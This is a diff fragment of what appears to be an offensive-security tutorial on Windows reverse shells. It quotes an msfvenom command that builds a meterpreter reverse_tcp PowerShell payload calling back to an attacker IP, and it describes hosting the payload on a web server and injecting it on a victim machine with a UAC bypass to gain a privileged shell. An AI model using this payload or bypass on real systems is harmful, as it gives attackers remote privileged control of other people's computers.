@@ -18,7 +18,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IPkali LPORT=4444 -f powershel
 
 <h3>Save the final PowerShell script and run it within the victim Windows machine.</h3>
 
-<h3>We can combine this script with the use of the following command in order to download and inject the script as an Administrator user bypassing UAC:</h3>
+<h3>We can combine this script with the use of the following command in order to download and inject the script as an Administrator user bypassing UAC, and obtaining a privileged shell:</h3>
 
 First of all you have to setup a python web server to host the payload, change the attacker IP and the PowerShell script name.
 
